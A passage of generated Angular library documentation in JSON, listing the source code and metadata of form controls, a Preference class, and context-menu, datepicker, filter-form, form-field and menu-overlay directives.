_parentForm, _parentFormGroup, ngControl);\r\n    this.form = this.fb.group({\r\n      value: [],\r\n      unit: []\r\n    });\r\n    if ( this.ngControl != null ) {\r\n      this.ngControl.valueAccessor = this;\r\n    }\r\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\r\n      this.focused = !!origin;\r\n      this.stateChanges.next();\r\n    });\r\n  }\r\n\r\n  ngDoCheck(): void {\r\n    if ( this.ngControl ) {\r\n      this.updateErrorState();\r\n    }\r\n  }\r\n\r\n\r\n  ngOnInit(): void {\r\n    const sub = this.form.valueChanges\r\n      .subscribe((value: NumberUnit) => {\r\n        const valueAsString = value.value as string;\r\n        let numberValue: number | null = parseFloat(this.numberFormatterPipe.parse(valueAsString, this.fractionSize));\r\n        numberValue = !isNaN(numberValue) ? numberValue : null;\r\n        this.onChange({ ...value, value: numberValue });\r\n      });\r\n\r\n    this.sub.add(this.stateChanges.pipe(debounceTime(50)).subscribe(() => {\r\n      this.numberInputDirective?.setDisplayValue(this.readonly);\r\n    }));\r\n    this.sub.add(sub);\r\n    if ( this.ngControl && this.ngControl.statusChanges ) {\r\n      this.sub.add(this.ngControl.statusChanges\r\n        .subscribe(() => this.updateErrorState())\r\n      );\r\n    }\r\n  }\r\n\r\n  ngOnDestroy(): void {\r\n    this.stateChanges.complete();\r\n    this.fm.stopMonitoring(this.elRef.nativeElement);\r\n    this.sub.unsubscribe();\r\n  }\r\n\r\n\r\n  onContainerClick(event: MouseEvent) {\r\n    const rect = this.input.nativeElement.getBoundingClientRect();\r\n    const isInputFocus = rect.right >= event.clientX;\r\n    if ( isInputFocus ) {\r\n      this.elRef.nativeElement.querySelector('input')?.focus();\r\n    } else {\r\n      this.select.focus();\r\n      this.select.open();\r\n    }\r\n  }\r\n\r\n\r\n  setDescribedByIds(ids: string[]) {\r\n    this.describedBy = ids.join(' ');\r\n  }\r\n\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-empty-function,@typescript-eslint/no-unused-vars\r\n  onChange = (_: unknown) => {\r\n  }\r\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\r\n  onTouched = () => {\r\n  }\r\n\r\n  writeValue(value: NumberUnit | null): void {\r\n    this.value = value;\r\n  }\r\n\r\n  registerOnChange(fn: never): void {\r\n    this.onChange = fn;\r\n  }\r\n\r\n  registerOnTouched(fn: never): void {\r\n    this.onTouched = fn;\r\n  }\r\n\r\n  setDisabledState(isDisabled: boolean): void {\r\n    this.disabled = isDisabled;\r\n  }\r\n\r\n}\r\n",
      "properties": [
        {
          "name": "unit",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 29
        },
        {
          "name": "value",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number | string",
          "optional": false,
          "description": "",
          "line": 28
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "Preference",
      "id": "class-Preference-fad41af7559484bfb7e67b88b0f6d7afb0c9d527c8f4f033b41bc13deffb172e3b660e2a8678625d46207af9d136dd8c393f875335575a812828b03d50858c80",
      "file": "libs/common/src/lib/preference-manager/preference.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "export class Preference {\r\n  id: string;\r\n  /**\r\n   * Userdefined name for the filter\r\n   */\r\n  name: string;\r\n  /**\r\n   * Username of the person who owns the filter\r\n   */\r\n  user: string;\r\n  /**\r\n   * identifierKey is used to distinguish between which area of the application the filter is used\r\n   * For example, identifierKey can be report_filter for a list of reports, and report_columns for the same list's column setup\r\n   */\r\n  identifierKey: string;\r\n  /**\r\n   * default determines if this is the default filter if no others are selected\r\n   * If no filters are marked as d\r\n   */\r\n  default?: boolean;\r\n  /**\r\n   * payload is the value of the preference (e.g the filters)\r\n   */\r\n  payload: Record<string, unknown>;\r\n  /**\r\n   * external determines if the preference is external, and if so, if it should be possible to save immediately.\r\n   */\r\n  external?: boolean;\r\n\r\n  constructor(identifierKey: string) {\r\n    this.name = 'New preference';\r\n    this.identifierKey = identifierKey;\r\n  }\r\n}\r\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "identifierKey",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 28,
        "jsdoctags": [
          {
            "name": "identifierKey",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "properties": [
        {
          "name": "default",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "<p>default determines if this is the default filter if no others are selected\nIf no filters are marked as d</p>\n",
          "line": 20,
          "rawdescription": "\n\ndefault determines if this is the default filter if no others are selected\nIf no filters are marked as d\n"
        },
        {
          "name": "external",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "<p>external determines if the preference is external, and if so, if it should be possible to save immediately.</p>\n",
          "line": 28,
          "rawdescription": "\n\nexternal determines if the preference is external, and if so, if it should be possible to save immediately.\n"
        },
        {
          "name": "id",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 2
        },
        {
          "name": "identifierKey",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "<p>identifierKey is used to distinguish between which area of the application the filter is used\nFor example, identifierKey can be report_filter for a list of reports, and report_columns for the same list&#39;s column setup</p>\n",
          "line": 15,
          "rawdescription": "\n\nidentifierKey is used to distinguish between which area of the application the filter is used\nFor example, identifierKey can be report_filter for a list of reports, and report_columns for the same list's column setup\n"
        },
        {
          "name": "name",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "<p>Userdefined name for the filter</p>\n",
          "line": 6,
          "rawdescription": "\n\nUserdefined name for the filter\n"
        },
        {
          "name": "payload",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Record<string | >",
          "optional": false,
          "description": "<p>payload is the value of the preference (e.g the filters)</p>\n",
          "line": 24,
          "rawdescription": "\n\npayload is the value of the preference (e.g the filters)\n"
        },
        {
          "name": "user",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "<p>Username of the person who owns the filter</p>\n",
          "line": 10,
          "rawdescription": "\n\nUsername of the person who owns the filter\n"
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    }
  ],
    "directives": [
      {
        "name": "ContextMenuDirective",
        "id": "directive-ContextMenuDirective-9ad3f64e587e7d2fe1e972c7e6c1780fef9327fd275047fcfc08384577aadf10e4545fbb3ee4c62fe84cb6b7401ba6efbaa515f65d7d99be617c6a83e7a0764b",
        "file": "libs/core/src/lib/sto-directives/context-menu.directive.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Directive, HostListener, Input } from '@angular/core';\r\nimport { MatMenuTrigger } from '@angular/material/menu';\r\nimport { MenuOverlayDirective } from './menu-overlay.directive';\r\n\r\n@Directive({\r\n  selector: '[stoContextMenu]'\r\n})\r\nexport class ContextMenuDirective {\r\n  @Input()\r\n  menuTrigger: MatMenuTrigger;\r\n  @Input()\r\n  overlayDirective: MenuOverlayDirective;\r\n  @Input()\r\n  menuContext: unknown;\r\n\r\n  @HostListener('contextmenu', [ '$event' ])\r\n  contextMenu(event: MouseEvent) {\r\n    event.preventDefault();\r\n    if ( this.menuTrigger.menuOpen ) {\r\n      this.menuTrigger.closeMenu();\r\n    }\r\n    this.overlayDirective.updatePosition(event);\r\n    setTimeout(() => {\r\n      this.menuTrigger.menuData = this.menuContext;\r\n      this.menuTrigger.openMenu();\r\n    }, 150);\r\n  }\r\n\r\n}\r\n",
        "selector": "[stoContextMenu]",
        "providers": [],
        "inputsClass": [
          {
            "name": "menuContext",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 14,
            "type": "",
            "decorators": []
          },
          {
            "name": "menuTrigger",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 10,
            "type": "MatMenuTrigger",
            "decorators": []
          },
          {
            "name": "overlayDirective",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 12,
            "type": "MenuOverlayDirective",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [
          {
            "name": "contextmenu",
            "args": [
              {
                "name": "event",
                "type": "MouseEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "argsDecorator": [
              "$event"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 17
          }
        ],
        "propertiesClass": [],
        "methodsClass": [
          {
            "name": "contextMenu",
            "args": [
              {
                "name": "event",
                "type": "MouseEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 17,
            "deprecated": false,
            "deprecationMessage": "",
            "decorators": [
              {
                "name": "HostListener",
                "stringifiedArguments": "'contextmenu', ['$event']"
              }
            ],
            "jsdoctags": [
              {
                "name": "event",
                "type": "MouseEvent",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ]
      },
      {
        "name": "DateFormFieldClickDirective",
        "id": "directive-DateFormFieldClickDirective-c698e9dd9cc1af94f2c8ecc35b3e1217a926eaea0019bccc0bcc8003ba062726442cc1bc968c4bd0b4f4fb8febbce88fdf34b2684bddedb42338356db8815c56",
        "file": "libs/core/src/lib/sto-directives/date-form-field-click.directive.ts",
        "type": "directive",
        "description": "<p>Directive that can be placed on mat-form-fields that contains a mat-datepicker.\nThis directive has two tasks:\nClicking anywhere on the mat-form-field will open the datepicker dialog\nWhen the datepicker is closed in any manner, we shift focus back to the datepicker input</p>\n",
        "rawdescription": "\n\nDirective that can be placed on mat-form-fields that contains a mat-datepicker.\nThis directive has two tasks:\nClicking anywhere on the mat-form-field will open the datepicker dialog\nWhen the datepicker is closed in any manner, we shift focus back to the datepicker input\n",
        "sourceCode": "import { ContentChildren, Directive, HostListener, Input, OnDestroy, OnInit, QueryList } from '@angular/core';\r\nimport { MatDatepicker } from '@angular/material/datepicker';\r\nimport { MatInput } from '@angular/material/input';\r\nimport { Subject } from 'rxjs';\r\nimport { takeUntil } from 'rxjs/operators';\r\n\r\n/**\r\n * Directive that can be placed on mat-form-fields that contains a mat-datepicker.\r\n * This directive has two tasks:\r\n * Clicking anywhere on the mat-form-field will open the datepicker dialog\r\n * When the datepicker is closed in any manner, we shift focus back to the datepicker input\r\n */\r\n@Directive({\r\n  selector: '[stoDateFormFieldClick]'\r\n})\r\nexport class DateFormFieldClickDirective implements OnInit, OnDestroy {\r\n  private destroy$ = new Subject();\r\n  @ContentChildren(MatInput) inputs: QueryList<MatInput>;\r\n  @Input() stoDateFormFieldClick: MatDatepicker<Date>;\r\n  @HostListener('click')\r\n  clickEvent() {\r\n    this.stoDateFormFieldClick.open();\r\n  }\r\n  ngOnInit() {\r\n    this.stoDateFormFieldClick.closedStream\r\n      .pipe(\r\n        takeUntil(this.destroy$)\r\n      ).subscribe(() => this.inputs.first.focus());\r\n  }\r\n  ngOnDestroy() {\r\n    this.destroy$.next(true);\r\n    this.destroy$.complete();\r\n  }\r\n}\r\n",
        "selector": "[stoDateFormFieldClick]",
        "providers": [],
        "inputsClass": [
          {
            "name": "stoDateFormFieldClick",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 19,
            "type": "MatDatepicker<Date>",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [
          {
            "name": "click",
            "args": [],
            "argsDecorator": [],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 21
          }
        ],
        "propertiesClass": [
          {
            "name": "destroy$",
            "defaultValue": "new Subject()",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 17,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "inputs",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "QueryList<MatInput>",
            "optional": false,
            "description": "",
            "line": 18,
            "decorators": [
              {
                "name": "ContentChildren",
                "stringifiedArguments": "MatInput"
              }
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "clickEvent",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 21,
            "deprecated": false,
            "deprecationMessage": "",
            "decorators": [
              {
                "name": "HostListener",
                "stringifiedArguments": "'click'"
              }
            ]
          },
          {
            "name": "ngOnDestroy",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 30,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngOnInit",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 24,
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "implements": [
          "OnInit",
          "OnDestroy"
        ],
        "readme": "<h4 id=\"dateformfieldclickdirective\">DateFormFieldClickDirective</h4>\n<p>Directive that can be placed on mat-form-fields that contains a mat-datepicker.</p>\n<p>This directive has two tasks:</p>\n<ol>\n<li>Clicking anywhere on the mat-form-field will open the datepicker dialog</li>\n<li>When the datepicker is closed in any manner, we shift focus back to the datepicker input</li>\n</ol>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;mat-form-field [stoDateFormFieldClick]=&quot;picker&quot;&gt;\n    &lt;input matInput\n        formControlName=&quot;date&quot;\n        [matDatepicker]=&quot;picker&quot; placeholder=&quot;Date&quot;&gt;\n    &lt;mat-datepicker-toggle matSuffix [for]=&quot;picker&quot;&gt;&lt;/mat-datepicker-toggle&gt;\n    &lt;mat-datepicker #picker&gt;&lt;/mat-datepicker&gt;\n&lt;/mat-form-field&gt;</code></pre></div>"
      },
      {
        "name": "FilterForm",
        "id": "directive-FilterForm-a39f73ad529ac9d51e1175b4351ade065081a3ea49d1dc5b72312f0f54d1ea7099371e968389d8410abc28a21583698ced663dc46774fd68f05988a64ec61eba",
        "file": "libs/common/src/lib/sto-filter/filter.ts",
        "type": "directive",
        "description": "<p>Abstract class utilized to decrease boiler plate for filters.\nGiven that most filters are identical in their base setup (a reactive form, using sto-filter-panel etc), this simplify writing filters.\nIt also allows you to have filter chips in your filter title with a base implementation (only needs a formConfig &amp; serializer fn)</p>\n",
        "rawdescription": "\n\nAbstract class utilized to decrease boiler plate for filters.\nGiven that most filters are identical in their base setup (a reactive form, using sto-filter-panel etc), this simplify writing filters.\nIt also allows you to have filter chips in your filter title with a base implementation (only needs a formConfig & serializer fn)\n",
        "sourceCode": "import { FormBuilder, FormGroup } from '@angular/forms';\r\nimport { EventEmitter, Input, OnDestroy, OnInit, Output, Directive } from '@angular/core';\r\nimport { Observable, OperatorFunction, Subject } from 'rxjs';\r\nimport { debounceTime, startWith, takeUntil } from 'rxjs/operators';\r\n\r\nexport interface FilterList {\r\n  key: string;\r\n  value: string;\r\n  index?: number;\r\n}\r\n\r\n/**\r\n * Abstract class utilized to decrease boiler plate for filters.\r\n * Given that most filters are identical in their base setup (a reactive form, using sto-filter-panel etc), this simplify writing filters.\r\n * It also allows you to have filter chips in your filter title with a base implementation (only needs a formConfig & serializer fn)\r\n */\r\n@Directive()\r\nexport abstract class FilterForm<T extends Record<string, unknown>> implements OnInit, OnDestroy {\r\n  // FormBuilder config\r\n  abstract formConfig: { [ key: string ]: unknown };\r\n  // Serializer function\r\n  abstract serializer: OperatorFunction<T, FilterList[]>;\r\n  protected destroyed$ = new Subject();\r\n  // Most filters will emit a filterChanged event\r\n  @Output()\r\n  filterChanged = new EventEmitter<T>();\r\n  // Initial value of the filter\r\n  @Input()\r\n  value: T;\r\n\r\n  // Form group\r\n  public form: FormGroup;\r\n  // Chip value. See {@link FilterList}\r\n  public filter$: Observable<FilterList[]>;\r\n\r\n  constructor(private fb: FormBuilder) {\r\n  }\r\n\r\n  ngOnInit() {\r\n    this.form = this.fb.group(this.formConfig);\r\n    this.form.reset(this.value || {});\r\n    this.filter$ = this.form\r\n      .valueChanges\r\n      .pipe(startWith<T>(this.form.value), this.serializer);\r\n    this.form.valueChanges\r\n      .pipe(\r\n        startWith(this.form.value),\r\n        debounceTime(250),\r\n        takeUntil(this.destroyed$)\r\n      ).subscribe(value => this.filterChanged.emit(value));\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n  }\r\n\r\n  /**\r\n   * This function clears the value for the given key.\r\n   * If index is passed in, it assumes the value for the key is an array, and removes the value at the given index.\r\n   * @param key\r\n   * @param index\r\n   */\r\n  public clearFilter(key: string, index?: number) {\r\n    if ( index || index === 0 ) {\r\n      const val = [...(this.form.get(key)?.value ?? [])];\r\n      val.splice(index, 1);\r\n      this.form.get(key)?.reset(val);\r\n    } else {\r\n      this.form.get(key)?.reset();\r\n    }\r\n  }\r\n\r\n  // Util function to resize tables. Looking to get rid of this...\r\n  public toggled() {\r\n    setTimeout(() => window.dispatchEvent(new Event('resize')), 300);\r\n  }\r\n\r\n}\r\n",
        "providers": [],
        "inputsClass": [
          {
            "name": "value",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 29,
            "type": "T",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "filterChanged",
            "defaultValue": "new EventEmitter<T>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 26,
            "type": "EventEmitter"
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "propertiesClass": [
          {
            "name": "destroyed$",
            "defaultValue": "new Subject()",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 23,
            "modifierKind": [
              122
            ]
          },
          {
            "name": "filter$",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Observable<FilterList[]>",
            "optional": false,
            "description": "",
            "line": 34,
            "modifierKind": [
              123
            ]
          },
          {
            "name": "form",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "FormGroup",
            "optional": false,
            "description": "",
            "line": 32,
            "modifierKind": [
              123
            ]
          },
          {
            "name": "formConfig",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "literal type",
            "optional": false,
            "description": "",
            "line": 20,
            "modifierKind": [
              126
            ]
          },
          {
            "name": "serializer",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "OperatorFunction<T | FilterList[]>",
            "optional": false,
            "description": "",
            "line": 22,
            "modifierKind": [
              126
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "clearFilter",
            "args": [
              {
                "name": "key",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "index",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 64,
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nThis function clears the value for the given key.\nIf index is passed in, it assumes the value for the key is an array, and removes the value at the given index.\n",
            "description": "<p>This function clears the value for the given key.\nIf index is passed in, it assumes the value for the key is an array, and removes the value at the given index.</p>\n",
            "modifierKind": [
              123
            ],
            "jsdoctags": [
              {
                "name": {
                  "pos": 2104,
                  "end": 2107,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "key"
                },
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "pos": 2098,
                  "end": 2103,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": ""
              },
              {
                "name": {
                  "pos": 2121,
                  "end": 2126,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "index"
                },
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "pos": 2115,
                  "end": 2120,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": ""
              }
            ]
          },
          {
            "name": "ngOnDestroy",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 53,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngOnInit",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 39,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "toggled",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 75,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              123
            ]
          }
        ],
        "implements": [
          "OnInit",
          "OnDestroy"
        ],
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "fb",
              "type": "FormBuilder",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 34,
          "jsdoctags": [
            {
              "name": "fb",
              "type": "FormBuilder",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      },
      {
        "name": "FormFieldDirective",
        "id": "directive-FormFieldDirective-ce440eebc7a2922c0db748e10de1267ba865fa767d823464a286641294f14944f8344aef120ef57eefa661c7048b2c112554611281fa53d985a8a91fc5ac6c80",
        "file": "libs/form/src/lib/sto-form/form-field.directive.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import {\r\n  AfterContentInit,\r\n  AfterViewInit,\r\n  ContentChildren,\r\n  Directive,\r\n  ElementRef,\r\n  HostBinding,\r\n  HostListener,\r\n  OnDestroy,\r\n  QueryList\r\n} from '@angular/core';\r\nimport { MatFormFieldControl } from '@angular/material/form-field';\r\nimport { MatInput } from '@angular/material/input';\r\nimport { Subject, Subscription } from 'rxjs';\r\nimport { debounceTime, filter, map, startWith, switchMap, takeUntil } from 'rxjs/operators';\r\nimport { MatSelect } from '@angular/material/select';\r\n\r\n@Directive({\r\n  selector: 'mat-form-field[stoFormField]',\r\n  exportAs: 'stoFormField'\r\n})\r\nexport class FormFieldDirective implements AfterViewInit, AfterContentInit, OnDestroy {\r\n  @ContentChildren(MatFormFieldControl)\r\n  input: QueryList<MatFormFieldControl<unknown>>;\r\n  @HostBinding('title')\r\n  title = '';\r\n  private destroyed$ = new Subject();\r\n  private titleSub: Subscription;\r\n\r\n  constructor(\r\n    private el: ElementRef<HTMLElement>) {\r\n  }\r\n\r\n  ngAfterViewInit(): void {\r\n    const el = this.el.nativeElement;\r\n    el.classList.add('sto-form__field');\r\n  }\r\n\r\n  ngAfterContentInit() {\r\n    this.input.changes\r\n      .pipe(\r\n        startWith(this.input),\r\n        map((list: QueryList<MatInput>) => list.first),\r\n        filter(el => !!el),\r\n        switchMap(el => el.stateChanges.pipe(startWith(null))),\r\n        takeUntil(this.destroyed$)\r\n      )\r\n      .subscribe(() => {\r\n        const { disabled } = this.input.first;\r\n        // eslint-disable-next-line\r\n        if (this.titleSub) {\r\n          this.titleSub.unsubscribe();\r\n        }\r\n        this.titleSub = this.input.first.stateChanges\r\n          .pipe(\r\n            debounceTime(30),\r\n            startWith(0)\r\n          )\r\n          .subscribe(() => {\r\n          if (this.input.first instanceof MatSelect) {\r\n            this.title = this.input.first.triggerValue;\r\n          } else {\r\n            this.title = this.input.first.value as string || '';\r\n          }\r\n        })\r\n        let readOnly = ( this.input.first as any ).readonly || false;\r\n        if ( this.input.first instanceof MatInput ) {\r\n          readOnly = this.input.first.readonly;\r\n        }\r\n\r\n        const el = this.el.nativeElement;\r\n        el.classList.remove('sto-form__field--readonly', 'sto-form__field--disabled');\r\n        if ( readOnly ) {\r\n          el.classList.add('sto-form__field--readonly');\r\n        }\r\n        if ( disabled ) {\r\n          el.classList.add('sto-form__field--disabled');\r\n        }\r\n        if ( this.input.first instanceof MatInput ) {\r\n          const inputEl = this.input.first[ '_elementRef' ] as ElementRef<HTMLInputElement>;\r\n          inputEl.nativeElement.autocomplete = 'off';\r\n        }\r\n      });\r\n  }\r\n\r\n  ngOnDestroy(): void {\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n  }\r\n\r\n  @HostListener('click')\r\n  @HostListener('dblclick')\r\n  onClick() {\r\n    if ( !( this.input.first instanceof MatInput ) ) {\r\n      return;\r\n    }\r\n    const el = this.input.first[ '_elementRef' ] as ElementRef<HTMLInputElement>;\r\n    if ( el.nativeElement.readOnly || el.nativeElement.disabled ) {\r\n      return;\r\n    }\r\n    const shouldSelect = true;\r\n    const textarea = el.nativeElement.tagName.toLowerCase() === 'textarea';\r\n    if ( shouldSelect && !textarea ) {\r\n      el.nativeElement.focus();\r\n      el.nativeElement.select();\r\n    }\r\n  }\r\n\r\n}\r\n",
        "selector": "mat-form-field[stoFormField]",
        "providers": [],
        "inputsClass": [],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "title",
            "defaultValue": "''",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 27,
            "type": "string",
            "decorators": []
          }
        ],
        "hostListeners": [
          {
            "name": "click",
            "args": [],
            "argsDecorator": [],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 94
          },
          {
            "name": "dblclick",
            "args": [],
            "argsDecorator": [],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 94
          }
        ],
        "propertiesClass": [
          {
            "name": "destroyed$",
            "defaultValue": "new Subject()",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 28,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "input",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "QueryList<MatFormFieldControl<>>",
            "optional": false,
            "description": "",
            "line": 25,
            "decorators": [
              {
                "name": "ContentChildren",
                "stringifiedArguments": "MatFormFieldControl"
              }
            ]
          },
          {
            "name": "title",
            "defaultValue": "''",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": false,
            "description": "",
            "line": 27,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'title'"
              }
            ]
          },
          {
            "name": "titleSub",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Subscription",
            "optional": false,
            "description": "",
            "line": 29,
            "modifierKind": [
              121
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "ngAfterContentInit",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 40,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngAfterViewInit",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 35,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngOnDestroy",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 87,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "onClick",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 94,
            "deprecated": false,
            "deprecationMessage": "",
            "decorators": [
              {
                "name": "HostListener",
                "stringifiedArguments": "'click'"
              },
              {
                "name": "HostListener",
                "stringifiedArguments": "'dblclick'"
              }
            ]
          }
        ],
            "implements": [
                "AfterViewInit",
                "AfterContentInit",
                "OnDestroy"
            ],
            "constructorObj": {
              "name": "constructor",
              "description": "",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "el",
                  "type": "ElementRef<HTMLElement>",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "line": 29,
              "jsdoctags": [
                {
                  "name": "el",
                  "type": "ElementRef<HTMLElement>",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            }
      },
      {
        "name": "MenuOverlayDirective",
        "id": "directive-MenuOverlayDirective-b063b6b862544bbc848a46b8ac7e119845b5cd15d5df7485a7ed0e8c5a375c5ad4ca06d5902f2b45b590618e34964a304b6303778d6e36c620a6ccabbcaec277",
        "file": "libs/core/src/lib/sto-directives/menu-overlay.directive.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Directive, ElementRef, Host, HostBinding } from '@angular/core';\r\nimport { MatMenuPanel, MatMenuTrigger } from '@angular/material/menu';\r\nimport { fromEvent } from 'rxjs';\r\nimport { switchMap, take } from 'rxjs/operators';\r\n\r\n@Directive({\r\n  selector: '[stoMenuOverlay]',\r\n  exportAs: 'stoMenuOverlay'\r\n})\r\nexport class MenuOverlayDirective {\r\n  private readonly menu: MatMenuPanel;\r\n  @HostBinding('style.left.px')\r\n  left = 0;\r\n  @HostBinding('style.top.px')\r\n  top = 0;\r\n\r\n  constructor(@Host() private trigger: MatMenuTrigger, el: ElementRef<HTMLButtonElement>) {\r\n    this.menu = trigger.menu;\r\n    this.trigger.menuOpened.pipe(\r\n      switchMap(() =>\r\n        fromEvent<MouseEvent>(document, 'click')\r\n          .pipe(take(1))\r\n      ),\r\n    ).subscribe(() => {\r\n      this.trigger.closeMenu();\r\n    });\r\n    this.setStyle(el.nativeElement);\r\n  }\r\n\r\n  public updatePosition(event: MouseEvent) {\r\n    this.left = event.x;\r\n    this.top = event.y;\r\n  }\r\n\r\n  private setStyle(element: HTMLButtonElement) {\r\n    element.style.overflow = 'hidden';\r\n    element.style.position = 'fixed';\r\n    element.style.height = '1px';\r\n    element.style.width = '1px';\r\n  }\r\n}\r\n",
